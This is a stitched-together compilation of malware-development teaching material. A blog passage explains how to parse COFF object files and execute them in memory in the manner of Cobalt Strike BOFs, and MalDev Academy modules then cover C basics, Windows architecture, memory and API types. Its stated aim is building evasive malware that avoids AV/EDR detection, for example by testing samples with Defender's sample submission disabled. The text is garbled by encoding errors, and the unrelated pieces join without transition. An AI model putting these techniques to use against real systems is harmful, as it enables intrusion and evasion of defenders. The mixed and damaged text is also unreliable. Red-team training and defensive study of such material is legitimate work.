Compilation using MSVC compiler (`cl.exe`) produces an object file (with??`.obj`??extension). We can analyze its content using??`dumpbin`??tool shipped with MSVC. Let???s see some of the tool???s output.

#### Directives (`.drectve`??section)

Here are linker directives, most importantly information on which libraries should be browsed for external functions.

![drectve.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/drectve.png)

#### Read-only data (`.rdata`??section)

This is statically initialized data, for example string literals.

![rdata.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/rdata.png)

#### Executable code (`.text`??section)

This is the actual assembly. In my example this section has been named??`.text$mn`??by the MSVC compiler.

![text.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/text.png)

This is where things get more interesting, let???s disassemble the code:

![code.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/code.png)

We see here how??`MessageBoxA`??arguments (int 0, char* ???Content???, char* ???Title???, int 0) are passed according to the??[x64 calling convention](https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention).

Let???s take a look at the third instruction (located at offset??`0x07`. When disassembled using for example??[ShellNoob](https://github.com/reyammer/shellnoob)??the instruction uses??`0x00000000`??offset:

![code2.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/code2.png)

So how does the??`dumpbin`??disassembler knows that function should reference a symbol? That???s where relocations come into play. Below the??`.text`??section raw data we can see relocation information. For example, first relocation table entry says that??`0x00000000`??bytes at offset??`0x0A`??(which is the second operand of??`lea`??instruction) should be replaced with actual (relative to??`RIP`) address of symbol no. 8.

The same goes for the??`call`??instruction at offset??`0x17`??along with respective relocation entry and symbol. However here relocation concerns relative function address address. That???s right - relative address (`call`??operand) gets dereferenced and the value stored there (actual??`MessageBoxA`??address) is called.

When the code gets loaded into system memory, loader parses relocation data and puts functions and data addresses in right places. However this happens during PE executable loading. We want to load the COFF object file, so we need to analyze it and perform in-memory relocations.

#### Symbol table

This table contains symbols such as static variables or external functions.

![symbols.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/symbols.png)

The symbol table is??[a bit tricky to read and understand](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#coff-symbol-table). However usually the??`Value`??field indicates the offset of the symbol within the section (described by??`SectionNumber`??field).

Also, to know where one symbol data ends, we need to check the offset of the next one in the same section or total section size.

## The object file loader

To inject and execute a simple COFF file we need to read the??`.text`??section and fill all zeros with relative addresses of external functions and static data (i.e. relocate symbols referenced in this section). Of course we also need to place these symbols somewhere in memory, for example after the assembly.

To find external functions we will need to browse libraries indicated in linker directives. We can use??`LoadLibrary`/`GetModuleHandle`/`GetProcAddress`??functions or for example browse PEB and??`InMemoryOrderModuleList`??(see part 4).

The diagram below illustrates this concept:

![concept.png](https://0xpat.github.io/images/2021-03-16-Malware_development_part_8/concept.png)

I used??[COFFI](https://github.com/serge1/COFFI)??library for parsing COFF files. This is a great header-only C++ library which has all functions I needed to read stuff from the object files. COFFI uses some of C++ Standard Library data structures like strings, vectors etc., and so does my code.

My algorithm goes like this:

1. Get pointers to??`.text`??section and relocations, directives, static data and symbol table.
2. Calculate memory needed for assembly + static data + external function pointers (by iterating all??`.text`??relocations).
3. Copy assembly to RW(X) memory.
4. Copy static symbols right after the code (each symbol size is calculated by checking offset of the next one in a given section).
5. While copying static symbols perform relocations (replace zeros in the assembly with relative addresses).
6. Resolve all static functions by looking in libraries referenced in linker directives (`LoadLibrary`??but??`dll`??not??`lib`??files), place addresses in the memory (right after static data; use??`GetProcAddress`) and perform relocations. WinAPI function names are prefixed with??`__imp_`??in the COFF symbol table.
7. Call the assembly start location (make sure the memory is executable - use??`VirtualProtect`??if necessary).

### Defining additional APIs

Cobalt Strike???s BOF implement a set of functions which can be called from the injected object file code (aka Beacon API). We can do it, too.

The object file loaded can have an internal function defined, for example:

```
void COFF_API_Print(char* string)
{
	printf(string);
}
```

and added as an import to the object file code:

`__declspec(dllimport) void COFF_API_Print(char* string);`

It then has to be processed like WinAPI imports during loading.

### Returning a value

When calling the injected??`main`??function from an object file, we can access the returned value from the caller:

`int returnedValue = ((int(*)())code)();`

### Caveats

- This PoC code assumes that the object file contains only single function (`main`) and won???t work if there are other subroutines.
- The object file is compiled without C Runtime and there are no runtime initialization funcitons -??`main`??is the entry point. Also, code optimizations by compiler are disabled.

## Summary

We???ve gained understanding of COFF object file format produced by MSVC compiler. Since these files contain all information needed to execute the code, they may be as well injected and executed in memory, delivered for example over a C&C channel. This is a powerful technique that surely poses a challenge to malicious code detection capabilities.
# 1.1 Introduction to Malware Development

### What is Malware?

Malware is a type of software specifically designed to perform malicious actions such as gaining unauthorized access to a machine or stealing sensitive data from a machine. The term "malware" is often associated with illegal or criminal conduct but it can also be used by ethical hackers such as penetration testers and red teamers for an authorized security assessment of an organization.

MalDev Academy assumes that users enrolled in this course will use the knowledge learned for ethical and legal purposes only. Any other uses can result in criminal charges and MalDev Academy will not be responsible for this.

### Why Learn Malware Development?

There are several reasons why someone would want to learn malware development. From an offensive security perspective, testers will often need to perform certain malicious tasks against a client's environment. Testers generally have three main options when it comes to the types of tools used in an engagement:

1. Open-Source Tools (OSTs) - These tools are generally signatured by security vendors and detected in any decently protected or mature organization. They are not always reliable when engaging in an offensive security assessment.

2. Purchasing Tools - Teams with larger budgets will often opt to purchase tools in order to save valuable time during engagements. Similar to custom tools, these are generally closed-source and have a better chance of evading security solutions.

3. Developing Custom Tools - Because these tools are custom-built, they have not been analyzed or signatured by security vendors which gives the attacking team an advantage when it comes to detection. This is where malware development knowledge becomes paramount for a more successful offensive security assessment.


### What Programming Language Should Be Used?

Technically speaking any programming language can be used to build malware such as Python, PowerShell, C#, C, C++ and Go. With that being said, there are a few reasons that some programming languages prevail over others when it comes to malware development and it usually boils down to the following points:

- Certain programming languages are more difficult to reverse engineer. It should always be a part of the attacker's goal to ensure defenders have limited understanding as to how the malware behaves

- Some programming languages require prerequisites on the target system. For example, executing a Python script requires an interpreter present on the target machine. Without the Python interpreter present on the machine, it is impossible to execute Python-based malware.

- Depending on the programming language the generated file size will differ.


### High-level vs Low-level Programming Languages

Programming languages can be classified into two different groups, high-level and low-level.

- High-level - Generally more abstracted from the operating system, less efficient with memory and provides the developer with less overall control due to the abstraction of several complex functions. An example of a high-level programming language is Python.

- Low-Level - Provides a way to interact with the operating system at an intimate level and provides the developer more freedom when interacting with the system. An example of a low-level programming language is C.


Given the previous explanations, it should become clear why low-level programming languages have been the preferred choice in malware development, especially when targeting Windows machines.

### Windows Malware Development

The Windows malware development scene has shifted within the past few years and is now highly focused on evading host-based security solutions such as Antivirus (AV) and Endpoint Detection and Response (EDR). With the advancement in technology, it is no longer sufficient to build malware that executes suspicious commands or performs "malware-like" actions.

MalDev Academy will teach you to build evasive malware that can be used in real engagements. The modules will also call out??[non-opsec](https://redteam.guide/docs/definitions/#:~:text=OPSEC%20or%20Operational%20Security%20is,that%20eliminate%20or%20reduce%20adversary)??actions or actions that will likely have your malware detected by security solutions or blue teams.

### Malware Development Life Cycle

Fundamentally, malware is a piece of software designed to perform certain actions. Successful software implementations require a process that's known as the Software Development Life Cycle (SDLC). Similarly, a well-built and complex malware will require a tailored version of the SDLC referred to as the Malware Development Life Cycle (MDLC).

Although the MDLC is not necessarily a formalized process, it is used in MalDev Academy to give the readers an easy way to understand the development process. The MDLC consists of 5 main stages:

1. Development - Begin the development or refinement of functionality within the malware.

2. Testing - Perform tests to uncover hidden bugs within the so-far developed code.

3. Offline AV/EDR Testing - Run the developed malware against as many security products as possible. It's important that the testing is conducted offline to ensure no samples are sent to the security vendors. Using Microsoft Defender, this is achieved by disabling the automated sample submissions & cloud-delivered protection option.

4. Online AV/EDR Testing - Run the developed malware against the security products with internet connectivity. Cloud engines are often key components in AVs/EDRs and therefore testing your malware against these components is crucial to gain more accurate results. Be cautious as this step may result in samples being sent to the security solution's cloud engine.

5. IoC (Indicators of Compromise) Analysis - In this stage, you become the threat hunter or malware analyst. Analyze the malware and pull out IoCs that can potentially be used to detect or signature the malware.

6. Return to step 1.
# 1.2 Coding Basics

### Introduction

As previously mentioned, this course requires a fundamental understanding of C as a prerequisite. With that being said, there are a few concepts that will be mentioned due to their importance throughout this course.

### Structures

Structures or Structs are user-defined data types that allow the programmer to group related data items of different data types into a single unit. Structs can be used to store data related to a particular object. Structs help organize large amounts of related data in a way that can be easily accessed and manipulated. Each item within a struct is called a "member" or "element", these terms are used interchangeably within the course.

A common occurrence one will see when working with the Windows API is that some APIs require a populated structure as input, while others will take a declared structure and populate it. Below is an example of the??`THREADENTRY32`??struct, it is not necessary to understand what the members are used for at this point.

```c
typedef struct tagTHREADENTRY32 {
  DWORD dwSize; // Member 1
  DWORD cntUsage; // Member 2
  DWORD th32ThreadID;
  DWORD th32OwnerProcessID;
  LONG  tpBasePri;
  LONG  tpDeltaPri;
  DWORD dwFlags;
} THREADENTRY32; 
```

#### Declaring a Structure

Structures used in this course are generally declared with the use of??`typedef`??keyword to give a structure an alias. For example, the structure below is created with the name??`_STRUCTURE_NAME`??but??`typedef`??adds two other names,??`STRUCTURE_NAME`??and??`*PSTRUCTURE_NAME`.

```c
typedef struct _STRUCTURE_NAME {

  // structure elements

} STRUCTURE_NAME, *PSTRUCTURE_NAME;
```

The??`STRUCTURE_NAME`??alias refers to the structure name, whereas??`PSTRUCTURE_NAME`??represents a pointer to that structure. Microsoft generally uses the??`P`??prefix to indicate a pointer type.

#### Initializing a Structure

Initializing a structure will vary depending on whether one is initializing the actual structure type or a pointer to the structure. Continuing the previous example, initializing a structure is the same when using??`_STRUCTURE_NAME`??or??`STRUCTURE_NAME`, as shown below.

```c
STRUCTURE_NAME    struct1 = { 0 };  // The '{ 0 }' part, is used to initialize all the elements of struct1 to zero
// OR
_STRUCTURE_NAME   struct2 = { 0 };  // The '{ 0 }' part, is used to initialize all the elements of struct2 to zero
```

This is different when initializing the structure pointer,??`PSTRUCTURE_NAME`.

```c
PSTRUCTURE_NAME structpointer = NULL;
```

#### Initializing and Accessing Structures Members

A structure's members can be initialized either directly through the structure or indirectly through a pointer to the structure. In the example below, the structure??`struct1`??has two members,??`ID`??and??`Age`, initialized directly via the dot operator (`.`).

```c
typedef struct _STRUCTURE_NAME {
  int ID;
  int Age;
} STRUCTURE_NAME, *PSTRUCTURE_NAME;

STRUCTURE_NAME struct1 = { 0 }; // initialize all elements of struct1 to zero
struct1.ID   = 1470;   // initialize the ID element
struct1.Age  = 34;     // initialize the Age element
```

Another way to initialize the members is using??_designated initializer syntax_??where one can specify which members of the structure to initialize.

```c
typedef struct _STRUCTURE_NAME {
  int ID;
  int Age;
} STRUCTURE_NAME, *PSTRUCTURE_NAME;

STRUCTURE_NAME struct1 = { .ID   = 1470,  .Age  = 34}; // initialize both the ID and the Age elements
```

On the other hand, accessing and initializing a structure through its pointer is done via the arrow operator (`->`).

```c
typedef struct _STRUCTURE_NAME {
  int ID;
  int Age;
} STRUCTURE_NAME, *PSTRUCTURE_NAME;

STRUCTURE_NAME struct1 = { .ID   = 1470,  .Age  = 34};

PSTRUCTURE_NAME structpointer = &struct1; // structpointer is a pointer to the 'struct1' structure

// Updating the ID member
structpointer->ID = 8765;
printf("The structure's ID member is now : %d \n", structpointer->ID);
```

The arrow operator can be converted into dot format. For example,??`structpointer->ID`??is equivalent to??`(*structpointer).ID`. That is,??`structurepointer`??is de-referenced and then accessed directly.

### Enumeration

The enum or enumeration data type is used to define a set of named constants. To create an enumeration, the??`enum`??keyword is used, followed by the name of the enumeration and a list of identifiers, each of which represents a named constant. The compiler automatically assigns values to the constants, starting with 0 and increasing by 1 for each subsequent constant. In this course, enums can be seen representing the state of specific data, error codes or return values.

An example of an enum is the list of "Weekdays" which contains 7 constants. In the example below, Monday has a value of 0, Tuesday has a value of 1, and so on. It's important to note that enum lists cannot be modified or accessed using the dot (.) operator. Instead, each element is accessed directly using its named constant value.

```c
enum Weekdays {
  Monday,         // 0
  Tuesday,        // 1
  Wednesday,      // 2
  Thursday,       // 3
  Friday,         // 4
  Saturday,       // 5
  Sunday          // 6
};

// Defining a "Weekdays" enum variable 
enum Weekdays EnumName = Friday;       // 4

// Check the value of "EnumName"
switch (EnumName){
    case Monday:
      printf("Today Is Monday !\n");
      break;
    case Tuesday:
      printf("Today Is Tuesday !\n");
      break;
    case Wednesday:
      printf("Today Is Wednesday !\n");
      break;
    case Thursday:
      printf("Today Is Thursday !\n");
      break;
    case Friday:
      printf("Today Is Friday !\n");
      break;
    case Saturday:
      printf("Today Is Saturday !\n");
      break;
    case Sunday:
      printf("Today Is Sunday !\n");
      break;
    default:
      break;
}
```

### Union

In the C programming language, a??[Union](https://learn.microsoft.com/en-us/cpp/cpp/unions?view=msvc-170)??is a data type that permits the storage of various data types in the same memory location. Unions provide an efficient way to use a single memory location for multiple purposes. Unions are not commonly used but can be seen in Windows-defined structures. The code below illustrates how to define a union in C:

```c
union ExampleUnion {
   int    IntegerVar;
   char   CharVar;
   float  FloatVar;
};
```

`ExampleUnion`??can store??`char`,??`int`??and??`float`??data types in the same memory location. To access the members of a union in C, one can use the dot operator, similar to that used for structures.

It's important to note that in a union, assigning a new value to any member will change the value of all other members as well because they share the same memory location to store their data. Additionally, the memory allocated for a union is equal to the size of its largest member.

### Bitwise Operators

Bitwise operators are operators that manipulate the individual bits of a binary value, performing operations on each corresponding bit position. The bitwise operators are shown below:

- Right shift (`>>`)

- Left shift (`<<`)

- Bitwise OR (`|`)

- Bitwise AND (`&`)

- Bitwise XOR (`^`)

- Bitwise NOT (`~`)


#### Right and Left Shift

The right shift (`>>`) and left shift (`<<`) operators are used to shift the bits of a binary number to the right and left by a specified number of positions, respectively.

Shifting right discards the rightmost number of bits by the specified value and zero bits of the same amount are inserted into the left. For example, the image below shows??`10100111`??shifted right by??`2`, to become??`00101001`.

![image](https://user-images.githubusercontent.com/111295429/233790472-9782abea-7104-4f8f-b927-5ee0e74e8424.png)

On the other hand, shifting left discards the leftmost bits and the same number of zero bits are inserted from the right handside. For example, the image below shows??`10100111`??shifted left by??`2`, to become??`10011100`.

![image](https://user-images.githubusercontent.com/111295429/233791839-6d230e61-7f27-43f3-95a2-dbd1ead75b6f.png)

#### Bitwise OR

The bitwise OR operation is a logical operation that involves two binary values at the bit level. It evaluates each bit of the first operand against the corresponding bit of the second operand, generating a new binary value. The new binary value contains a 1 in any bit position where either one or both of the corresponding bits in the original values are 1.

The following table represents the bitwise OR output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233792537-7fe6b3df-a217-4a7a-bae8-a20e1c86be0f.png)

#### Bitwise AND

The bitwise AND operation is a logical operation that involves two binary values at the bit level. This operation sets the bits of the new binary value to 1 only in the case where the corresponding bits of both input operands are 1.

The following table represents the bitwise AND output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233792744-d6e10278-323c-48f0-8740-7f2ad579a71c.png)

#### Bitwise XOR

The bitwise XOR operation (also known as exclusive OR) is a logical operation that involves two binary values at the bit level. If only one of the bits is 1, the result in each position is 1. Conversely, if both bits are 0 or 1, the output is 0.

The following table represents the bitwise XOR output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233793118-743398f2-e21c-441c-bb79-a80fe7876719.png)

#### Bitwise NOT

The bitwise NOT operation takes one binary number and flips all its bits. In other words, it changes all 0s to 1s and all 1s to 0s. The following table represents the bitwise XOR output with all the possible input bits.

![image](https://user-images.githubusercontent.com/111295429/233794817-82f48b9f-8770-413c-b4e3-b16697adcac6.png)

### Passing By Value

Passing by value is a method of passing arguments to a function where the argument is a copy of the object's value. This means that when an argument is passed by value, the value of the object is copied and the function can only modify its local copy of the object's value, not the original object itself.

```c
int add(int a, int b)
{
   int result = a + b;
   return result;
}

int main()
{
   int x = 5;
   int y = 10;
   int sum = add(x, y); // x and y are passed by value

   return 0;
}
```

### Passing By Reference

Passing by reference is a method of passing arguments to a function where the argument is a pointer to the object, rather than a copy of the object's value. This means that when an argument is passed by reference, the memory address of the object is passed instead of the value of the object. The function can then access and modify the object directly, without creating a local copy of the object.

```c
void add(int *a, int *b, int *result)
{
  
  int A = *a; // A is now the same value of a passed in from the main function
  int B = *b; // B is now the same value of b passed in from the main function
  
  *result = B + A;
}

int main()
{
   int x = 5;
   int y = 10;
   int sum = 0;

   add(&x, &y, &sum);
  
   // 'sum' now is 15
   
   return 0;
}
```
# 1.3 Windows Architecture

### Introduction

This module explains the Windows architecture and what happens under the hood of Windows processes and applications.

### Windows Architecture

A processor inside a machine running the Windows operating system can operate under two different modes: User Mode and Kernel Mode. Applications run in user mode, and operating system components run in kernel mode. When an application wants to accomplish a task, such as creating a file, it cannot do so on its own. The only entity that can complete the task is the kernel, so instead applications must follow a specific function call flow. The diagram below shows a high level of this flow.

![Windows-Architecture](https://maldevacademy.s3.amazonaws.com/images/Basic/4-windows-architecture/arch-diagram.png)

1. **User Processes**??- A program/application executed by the user such as Notepad, Google Chrome or Microsoft Word.

2. **Subsystem DLLs**??- DLLs that contain API functions that are called by user processes. An example of this would be??`kernel32.dll`??exporting the??[CreateFile](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)??Windows API (WinAPI) function, other common subsystem DLLs are??`ntdll.dll`,??`advapi32.dll`, and??`user32.dll`.

3. **Ntdll.dll**??- A system-wide DLL which is the lowest layer available in user mode. This is a special DLL that creates the transition from user mode to kernel mode. This is often referred to as the Native API or NTAPI.

4. **Executive Kernel**??- This is what is known as the Windows Kernel and it calls other drivers and modules available within kernel mode to complete tasks. The Windows kernel is partially stored in a file called??`ntoskrnl.exe`??under "C:\Windows\System32".


### Function Call Flow

The image below shows an example of an application that creates a file. It begins with the user application calling the??`CreateFile`??WinAPI function which is available in??`kernel32.dll`.??`Kernel32.dll`??is a critical DLL that exposes applications to the WinAPI and is therefore can be seen loaded by most applications. Next,??`CreateFile`??calls its equivalent NTAPI function,??`NtCreateFile`, which is provided through??`ntdll.dll`.??`Ntdll.dll`??then executes an assembly??`sysenter`??(x86) or??`syscall`??(x64) instruction, which transfers execution to kernel mode. The kernel??`NtCreateFile`??function is then used which calls kernel drivers and modules to perform the requested task.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/windows-arch-flow.png)

### Function Call Flow Example

This example shows the function call flow happening through a debugger. This is done by attaching a debugger to a binary that creates a file via the??`CreateFileW`??Windows API.

The user application calls the??`CreateFileW`??WinAPI.

![CreateFileW](https://maldevacademy.s3.amazonaws.com/images/Basic/createfilew-dbg.png)

Next,??`CreateFileW`??calls its equivalent NTAPI function,??`NtCreateFile`.

![NtCreateFile](https://maldevacademy.s3.amazonaws.com/images/Basic/ntcreatefile-dbg.png)

Finally, the??`NtCreateFile`??function uses a??`syscall`??assembly instruction to transition from user mode to kernel mode. The kernel will then be the one that creates the file.

![Syscall](https://maldevacademy.s3.amazonaws.com/images/Basic/syscall.png)

### Directly Invoking The Native API (NTAPI)

It's important to note that applications can invoke syscalls (i.e. NTDLL functions) directly without having to go through the Windows API. The Windows API simply acts as a wrapper for the Native API. With that being said, the Native API is more difficult to use because it is not officially documented by Microsoft. Furthermore, Microsoft advises against the use of Native API functions because they can be changed at any time without warning.

Future modules will explore the benefits of directly invoking the Native API.
# 1.4 Windows Memory Management

### Introduction

This module goes through the fundamentals of Windows memory. Understanding how Windows handles memory is crucial to building advanced malware.

### Virtual Memory & Paging

Memory in modern operating systems is not mapped directly to physical memory (i.e the RAM). Instead, virtual memory addresses are used by processes that are mapped to physical memory addresses. There are several reasons for this but ultimately the goal is to save as much physical memory as possible. Virtual memory may be mapped to physical memory but can also be stored on disk. With virtual memory addressing it becomes possible for multiple processes to share the same physical address while having a unique virtual memory address. Virtual memory relies on the concept of??_Memory paging_??which divides memory into chunks of 4kb called "pages".

See the image below from the??[Windows Internals 7th edition - part 1](https://learn.microsoft.com/en-us/sysinternals/resources/windows-internals)??book.

![Virtual-Mem](https://maldevacademy.s3.amazonaws.com/images/Basic/5-windows-memory-management/virtual-memory.png)

### Page State

The pages residing within a process's virtual address space can be in one of 3 states:

1. **Free**??- The page is neither committed nor reserved. The page is not accessible to the process. It is available to be reserved, committed, or simultaneously reserved and committed. Attempting to read from or write to a free page can result in an access violation exception.

2. **Reserved**??- The page has been reserved for future use. The range of addresses cannot be used by other allocation functions. The page is not accessible and has no physical storage associated with it. It is available to be committed.

3. **Committed**??- Memory charges have been allocated from the overall size of RAM and paging files on disk. The page is accessible and access is controlled by one of the memory protection constants. The system initializes and loads each committed page into physical memory only during the first attempt to read or write to that page. When the process terminates, the system releases the storage for committed pages.


### Page Protection Options

Once the pages are committed, they need to have their protection option set. The list of memory protection constants can be found??[here](https://learn.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)??but some examples are listed below.

- `PAGE_NOACCESS`??- Disables all access to the committed region of pages. An attempt to read from, write to or execute the committed region will result in an access violation.

- `PAGE_EXECUTE_READWRITE`??- Enables Read, Write and Execute. This is highly discouraged from being used and is generally an IoC because it's uncommon for memory to be both writable and executable at the same time.

- `PAGE_READONLY`??- Enables read-only access to the committed region of pages. An attempt to write to the committed region results in an access violation.


### Memory Protection

Modern operating systems generally have built-in memory protections to thwart exploits and attacks. These are also important to keep in mind as they will likely be encountered when building or debugging the malware.

- **Data Execution Prevention (DEP)**??- DEP is a system-level memory protection feature that is built into the operating system starting with Windows XP and Windows Server 2003. If the page protection option is set to PAGE_READONLY, then DEP will prevent code from executing in that memory region.
    
- **Address space layout randomization (ASLR)**??- ASLR is a memory protection technique used to prevent the exploitation of memory corruption vulnerabilities. ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap and libraries.
    

### x86 vs x64 Memory Space

When working with Windows processes, it's important to note whether the process is x86 or x64. x86 processes have a smaller memory space of 4GB (`0xFFFFFFFF`) whereas x64 has a vastly larger memory space of 128TB (`0xFFFFFFFFFFFFFFFF`).

### Allocating Memory Example

This example goes through small code snippets to better understand how one can interact with Windows memory via C functions and Windows APIs. The first step in interacting with memory is allocating memory. The snippet below demonstrates several ways to allocate memory which is essentially reserving a memory inside the running process.

```c
// Allocating a memory buffer of *100* bytes

// Method 1 - Using malloc()
PVOID pAddress = malloc(100);

// Method 2 - Using HeapAlloc()
PVOID pAddress = HeapAlloc(GetProcessHeap(), 0, 100);

// Method 3 - Using LocalAlloc()
PVOID pAddress = LocalAlloc(LPTR, 100);
```

Memory allocation functions return the??_base address_??which is simply a pointer to the beginning of the memory block that was allocated. Using the snippets above,??`pAddress`??will be the base address of the memory block that was allocated. Using this pointer several actions can be taken such as reading, writing, and executing. The type of actions that can be performed will depend on the protection assigned to the allocated memory region.

The image below shows what??`pAddress`??looks like under the debugger.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-105290746-d5fa58f7-b3d7-4064-98b8-6f7ee5dcc12d.png)

```c
#include <Windows.h>
#include <stdio.h>

int main() {
	PVOID pAddress = HeapAlloc(GetProcessHeap(), 0, 100);

	printf("[+] Base Address of Allocated Memory: 0x%p \n", pAddress);

	printf("[#] Press <Enter> to Quit...");
	getchar();

	return 0;
}
```

When memory is allocated, it may either be empty or contain random data. Some memory allocation functions provide an option to zero out the memory region during the allocation process.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-205290946-31ab4c35-b0e6-4727-9d45-8e439453207d.png)

### Writing To Memory Example

The next step after memory allocation is generally writing to that buffer. Several options can be used to write to memory but for this example,??`memcpy`??is used.

```c
PVOID pAddress	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);

CHAR* cString	= "MalDev Academy Is The Best";

memcpy(pAddress, cString, strlen(cString));
```

```c
#include <Windows.h>
#include <stdio.h>

int main() {
	PVOID pAddress	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);

	CHAR* cString	= "MalDev Academy Is The Best";
	
	memcpy(pAddress, cString, strlen(cString));

	printf("[+] Base Address of Allocated Memory: 0x%p \n", pAddress);

	printf("[#] Press <Enter> to Quit...");
	getchar();

	return 0;
}
```
`HeapAlloc`??uses the??`HEAP_ZERO_MEMORY`??flag which causes the allocated memory to be initialized to zero. The string is then copied to the allocated memory using??`memcpy`. The last parameter in??`memcpy`??is the number of bytes to be copied. Next, recheck the buffer to verify that the data was successfully written.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-305293097-6334290e-3d79-4254-9a79-cd7011ca4bbc.png)

### Freeing Allocated Memory

When the application is done using an allocated buffer, it is highly recommended to deallocate or free the buffer to avoid??[memory leaks](https://en.wikipedia.org/wiki/Memory_leak).

Depending on what function was used to allocate memory, it will have a corresponding memory deallocation function. For example:

- Allocating with??`malloc`??requires the use of the??`free`??function.

- Allocating with??`HeapAlloc`??requires the use of the??`HeapFree`??function.

- Allocating with??`LocalAlloc`??requires the use of the??`LocalFree`??function.

```c
#include <Windows.h>
#include <stdio.h>

int main() {
	PVOID pAddress	= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100);

	CHAR* cString	= "MalDev Academy Is The Best";
	
	memcpy(pAddress, cString, strlen(cString));

	printf("[+] Base Address of Allocated Memory: 0x%p \n", pAddress);

	printf("[#] Press <Enter> to Quit...");
	getchar();

	HeapFree(GetProcessHeap(), 0, pAddress)
	return 0;
}
```

The images below show??`HeapFree`??in action, freeing allocated memory at address??`0000023ADE449900`. Notice the address??`0000023ADE449900`??still exists within the process but its original content was overwritten with random data. This new data is most likely due to a new allocation performed by the OS inside the process.

![IMAGE](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-424394866-a0dead3a-b72b-4600-8003-b8ecc2a27449.png)

![IMAGE](https://maldevacademy.s3.amazonaws.com/images/Basic/memory-mgmt-524394895-7c747075-d866-4ca8-a15f-09cb4fec7e6d.png)
# 1.5 Introduction To The Windows API

### Introduction

The Windows API provides developers with a way for their applications to interact with the Windows operating system. For example, if the application needs to display something on the screen, modify a file or query the registry all of these actions can be done via the Windows API. The Windows API is very well documented by Microsoft and can be viewed??[here](https://learn.microsoft.com/en-us/windows/win32/apiindex/windows-api-list).

### Windows Data Types

The Windows API has many data types outside of the well-known ones (e.g. int, float). The data types are documented and can be viewed??[here](https://learn.microsoft.com/en-us/windows/win32/winprog/windows-data-types).

Some of the common data types are listed below:

- `DWORD`??- A 32-bit unsigned integer, on both 32-bit and 64-bit systems, used to represent values from 0 up to (2^32 - 1).

```c
DWORD dwVariable = 42;
```

- `size_t`??- Used to represent the size of an object. It's a 32-bit unsigned integer on 32-bit systems representing values from 0 up to (2^32 - 1). On the other hand, it's a 64-bit unsigned integer on 64-bit systems representing values from 0 up to (2^64 - 1).

```c
SIZE_T sVariable = sizeof(int);
```

- `VOID`??- Indicates the absence of a specific data type.

```c
void* pVariable = NULL; // This is the same as PVOID
```

- `PVOID`??- A 32-bit or 4-byte pointer of any data type on 32-bit systems. Alternatively, a 64-bit or 8-byte pointer of any data type on 64-bit systems.

```c
PVOID pVariable = &SomeData;
```

- `HANDLE`??- A value that specifies a particular object that the operating system is managing (e.g. file, process, thread).

```c
HANDLE hFile = CreateFile(...);
```

- `HMODULE`??- A handle to a module. This is the base address of the module in memory. An example of a MODULE can be a DLL or EXE file.

```c
HMODULE hModule = GetModuleHandle(...);
```

- `LPCSTR/PCSTR`??- A pointer to a constant null-terminated string of 8-bit Windows characters (ANSI). The "L" stands for "long" which is derived from the 16-bit Windows programming period, nowadays it doesn't affect the data type, but the naming convention still exists. The "C" stands for "constant" or read-only variable. Both these data types are equivalent to??`const char*`.

```c
LPCSTR  lpcString   = "Hello, world!";
PCSTR   pcString    = "Hello, world!";
```

- `LPSTR/PSTR`??- The same as??`LPCSTR`??and??`PCSTR`, the only difference is that??`LPSTR`??and??`PSTR`??do not point to a constant variable, and instead point to a readable and writable string. Both these data types are equivalent to??`char*`.

```c
LPSTR   lpString    = "Hello, world!";
PSTR    pString     = "Hello, world!";
```

- `LPCWSTR\PCWSTR`??- A pointer to a constant null-terminated string of 16-bit Windows Unicode characters (Unicode). Both these data types are equivalent to??`const wchar*`.

```c
LPCWSTR     lpwcString  = L"Hello, world!";
PCWSTR      pcwString   = L"Hello, world!";
```

- `PWSTR\LPWSTR`??- The same as??`LPCWSTR`??and??`PCWSTR`, the only difference is that 'PWSTR' and 'LPWSTR' do not point to a constant variable, and instead point to a readable and writable string. Both these data types are equivalent to??`wchar*`.

```c
LPWSTR  lpwString   = L"Hello, world!";
PWSTR   pwString    = L"Hello, world!";
```

- `wchar_t`??- The same as??`wchar`??which is used to represent wide characters.

```c
wchar_t     wChar           = L'A';
wchar_t*    wcString        = L"Hello, world!";
```

- `ULONG_PTR`??- Represents an unsigned integer that is the same size as a pointer on the specified architecture, meaning on 32-bit systems a??`ULONG_PTR`??will be 32 bits in size, and on 64-bit systems, it will be 64 bits in size. Throughout this course,??`ULONG_PTR`??will be used in the manipulation of arithmetic expressions containing pointers (e.g. PVOID). Before executing any arithmetic operation, a pointer will be subjected to type-casting to??`ULONG_PTR`. This approach is used to avoid direct manipulation of pointers which can lead to compilation errors.

```c
PVOID Pointer = malloc(100);
// Pointer = Pointer + 10; // not allowed
Pointer = (ULONG_PTR)Pointer + 10; // allowed
```

### Data Types Pointers

The Windows API allows a developer to declare a data type directly or a pointer to the data type. This is reflected in the data type names where the data types that start with "P" represent pointers to the actual data type while the ones that don't start with "P" represent the actual data type itself.

This will become useful later when working with Windows APIs that have parameters that are pointers to a data type. The examples below show how the "P" data type relates to its non-pointer equivalent.

- `PHANDLE`??is the same as??`HANDLE*`.
    
- `PSIZE_T`??is the same as??`SIZE_T*`.
    
- `PDWORD`??is the same as??`DWORD*`.
    

### ANSI & Unicode Functions

